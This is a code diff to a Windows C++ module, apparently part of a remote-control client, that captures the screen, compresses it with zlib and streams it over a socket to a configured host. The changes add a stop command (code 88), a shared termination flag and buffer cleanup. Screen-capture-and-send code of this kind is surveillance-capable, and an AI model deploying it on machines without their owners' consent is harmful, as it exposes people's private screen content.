@@ -4,7 +4,11 @@
 #include "./zlib.h"
 #pragma comment(lib,"./zlib.lib")	//图象无损数据压缩使用zlib库函数
 
+
+
+
 int g_ScreenBits;//图像的位数
+int end = 0;
 
 CScreenManage::CScreenManage(void)
 {
@@ -27,6 +31,7 @@ DWORD __stdcall ScreenManageThread(LPVOID lparam)//线程处理屏幕传输
 	Screen.m_MainSocket = *pParam;
 	SOCKET MainSocket = Screen.m_MainSocket;
 	*/
+	end = 0;
 	struct sockaddr_in LocalAddr;
 	LocalAddr.sin_family=AF_INET;
 	LocalAddr.sin_port = htons(ConnectInfo::getConnectInfo()->port);
@@ -35,7 +40,7 @@ DWORD __stdcall ScreenManageThread(LPVOID lparam)//线程处理屏幕传输
 	SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0);//重新建立一个专门的socket和客户端进行交互
 	if(connect(MainSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
 	{
-		closesocket(MainSocket);
+	     closesocket(MainSocket);
 		return 0;//connect error
 	}
 
@@ -49,7 +54,10 @@ DWORD __stdcall ScreenManageThread(LPVOID lparam)//线程处理屏幕传输
 	if(!SendMsg(MainSocket, NULL, &msgHead))
 	{
 		if(chBuffer != NULL)
+		{
 			delete []chBuffer;
+			chBuffer = NULL;
+		}
 		return 0; 
 	}
 	// ::MessageBox(NULL, "第一个while(1)前没有崩溃", "DD", MB_OK);
@@ -70,12 +78,21 @@ DWORD __stdcall ScreenManageThread(LPVOID lparam)//线程处理屏幕传输
 				*pDWORD = MainSocket;
 				g_ScreenBits = msgHead.dwExtend1;
 				CreateThread(NULL, NULL, SendScreen, pDWORD, NULL, NULL);
-
+				//delete pDWORD;
 				break;
 			}
 		case CMD_CHANGE_SCREEN_BITS:
 			{
 				g_ScreenBits = msgHead.dwExtend1;
+				break;
+			}
+		case 88:
+			{
+				end = 1;
+				if(chBuffer != NULL)
+					delete[] chBuffer;
+				closesocket(MainSocket);
+				return 0;
 				break;
 			}
 
@@ -90,7 +107,7 @@ DWORD __stdcall ScreenManageThread(LPVOID lparam)//线程处理屏幕传输
 		//	break;
 	}
 
-
+	end = 1;
 	if(chBuffer != NULL)
 		delete[] chBuffer;
 	closesocket(MainSocket);
@@ -133,7 +150,7 @@ DWORD __stdcall SendScreen(LPVOID lparam)//线程处理屏幕传输
 
 	while(1)
 	{
-
+		if( end == 1) break;
 		if(ScreenBits != g_ScreenBits)
 		{
 			ScreenBits = g_ScreenBits;
@@ -320,22 +337,37 @@ DWORD __stdcall SendScreen(LPVOID lparam)//线程处理屏幕传输
 			::DeleteObject(MemDC);
 			::ReleaseDC(hWnd,hScreenDC);
 			DeleteObject(hBitmap);
-
-			delete [] pLastData;
-			delete [] pDataCompressd;
-			delete [] pData;
-			delete [] pChanged;
-			//::MessageBox(NULL, "发送失败","",MB_OK);
+			if(pLastData != NULL)
+			{
+				delete [] pLastData;   pLastData = NULL;
+			}
+			if(pDataCompressd != NULL){
+				delete [] pDataCompressd;  pDataCompressd = NULL;
+			}
+			if(pData != NULL){
+				delete [] pData;  pData = NULL;
+			}
+			if(pChanged != NULL){
+				delete[] pChanged; pChanged = NULL;
+			}
 			return 0;
 		}
 		IsFirst = FALSE;
-
-		delete [] pDataCompressd;
-		delete [] pData;
+		if(pDataCompressd != NULL){
+			delete [] pDataCompressd;  pDataCompressd = NULL;
+		}
+		if(pData != NULL){
+			delete[] pData; pData = NULL;
+		}
 		if ((GetTickCount() - dwLastSend) < 110)
 			Sleep(100);
-
 	}
+
+	if(pLastData != NULL)
+		delete [] pLastData;
+	if(pChanged != NULL)
+		delete [] pChanged;
+
 
 	return 0;
 }
